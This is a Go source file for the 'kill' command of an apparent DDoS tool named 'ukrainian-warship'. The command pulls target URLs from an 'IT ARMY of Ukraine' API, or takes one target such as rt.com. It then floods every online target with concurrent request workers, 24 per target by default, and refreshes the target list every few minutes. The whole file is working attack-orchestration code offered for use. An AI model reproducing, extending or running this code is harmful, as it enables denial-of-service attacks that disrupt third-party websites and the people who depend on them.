/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/briandowns/spinner"
	"github.com/seedpockets/ukrainian-warship/pkg/api_client"
	"github.com/seedpockets/ukrainian-warship/pkg/ddos"
	"github.com/spf13/cobra"
)

// killCmd represents the kill command
var killCmd = &cobra.Command{
	Use:   "kill",
	Short: "Run automatic attack",
	Long: `Fetches IT ARMY of Ukraine targets(from official api) and attacks. 

Periodically updates target list and evenly spreads load among online
targets.

Default worker amount is 24 per target.`,
	Run: func(cmd *cobra.Command, args []string) {
		singleTarget, _ := cmd.Flags().GetString("target")
		debug, _ := cmd.Flags().GetBool("debug")
		workers, _ := cmd.Flags().GetInt("workers")
		refreshRate, _ := cmd.Flags().GetFloat64("refresh")
		if singleTarget != "" {
			KillSingleTarget(singleTarget, workers, debug)
		} else {
			KillAll(workers, refreshRate, debug)
		}
	},
}

func init() {
	rootCmd.AddCommand(killCmd)
	killCmd.Flags().String("target", "", "--target=https://ww.rt.com takes aim at a single target")
	killCmd.Flags().Int("workers", 24, "--workers=1024 set number of workers per target")
	killCmd.Flags().Float64("refresh", 5, "--refresh=10 number of minutes between refreshing target URLs")
	killCmd.Flags().Bool("debug", false, "--debug=true defaults to false")
}

type total int64

func (c *total) inc() int64 {
	return atomic.AddInt64((*int64)(c), 1)
}

func (c *total) get() int64 {
	return atomic.LoadInt64((*int64)(c))
}

func KillSingleTarget(target string, workers int, debug bool) {
	var totalReq total
	var wg sync.WaitGroup
	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
	spin.Prefix = fmt.Sprintf("Attacking target: %s ", target)
	if !debug {
		spin.Start()
	}
	warship := ddos.New(target, true, debug)
	wg.Add(workers + 1) // +1 for the terminal stats printer
	c1, cancel := context.WithCancel(context.Background())
	exitCh := make(chan struct{})
	for i := 0; i < workers; i++ {
		go func(ctx context.Context) {
			for {
				warship.Do()
				totalReq.inc()
				select {
				case <-ctx.Done():
					fmt.Println("received done, exiting in 50 milliseconds")
					time.Sleep(50 * time.Millisecond)
					wg.Done()
					exitCh <- struct{}{}
					return
				default:
				}
			}
		}(c1)
	}
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	go func() {
		select {
		case <-signalCh:
			if !debug {
				spin.Stop()
			}
			cancel()
			return
		}
	}()
	<-exitCh
	wg.Wait()
	fmt.Printf("Target: %s\t\t Total requests: %d\n", target, totalReq)
}

func KillAll(workers int, r float64, debug bool) {
	refreshTime := time.Now().Add(time.Minute * 1).Unix()
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	spin := spinner.New(spinner.CharSets[1], 100*time.Millisecond) // Build our new spinner
	spin.Prefix = "Ukrainian Warship goes brrr.... "
	running := true
	for running {
		targets, err := getTargets()
		if err != nil {
			panic(err)
		}
		fmt.Printf("Getting updated targets every %0.f minutes...\n", r)
		var wg sync.WaitGroup
		for i := range targets.Online {
			fmt.Println("Targets: ", targets.Online[i])
		}
		wg.Add(workers * len(targets.Online)) // +1 for the terminal stats printer
		c1, cancel := context.WithCancel(context.Background())
		exitCh := make(chan struct{})
		if !debug {
			spin.Start()
		}
		RunAll(workers, r, debug, targets, &wg, &c1, cancel, &exitCh, &signalCh)
		wait := true
		for wait {
			if time.Now().Unix() > refreshTime {
				if !debug {
					spin.Stop()
				}
				cancel()
				wg.Wait()
				wait = false
			} else {
				select {
				case <-signalCh:
					running = false
					cancel()
					return
				}
			}
		}
	}
}

func RunAll(workers int, r float64, debug bool, targets *api_client.TargetsItArmy, wg *sync.WaitGroup, c1 *context.Context, cancel context.CancelFunc, exitCh *chan struct{}, signalCh *chan os.Signal) {
	armada := []ddos.Ddos{}
	for i := 0; i < len(targets.Online); i++ {
		f := ddos.New(targets.Online[i], false, debug)
		armada = append(armada, f)
	}
	for i := 0; i < len(armada); i++ {
		for j := 0; j < workers; j++ {
			go func(ctx context.Context, d ddos.Ddos) {
				for {
					select {
					case <-ctx.Done():
						time.Sleep(25 * time.Millisecond)
						wg.Done()
						*exitCh <- struct{}{}
						return
					default:
						d.Do()
						runtime.Gosched()
					}
				}
			}(*c1, armada[i])
		}
	}
	go func() {
		select {
		case <-*signalCh:
			cancel()
			return
		}
	}()
	<-*exitCh
	wg.Wait()
	for _, v := range armada {
		fmt.Printf("Total requests: %d\tRequest Errors: %d\t\tTarget: %s\n", v.GetTotal(), v.GetError(), v.GetUrl())
	}
}

func getTargets() (*api_client.TargetsItArmy, error) {
	fmt.Println("Ukrainian Warship Acquiring targets...")
	targets, err := api_client.GetTargets()
	if err != nil {
		return nil, err
	}
	fmt.Println("Targets acquired...")
	return targets, nil
}

func clearScreen() {
	fmt.Printf("\x1b[2J")
}
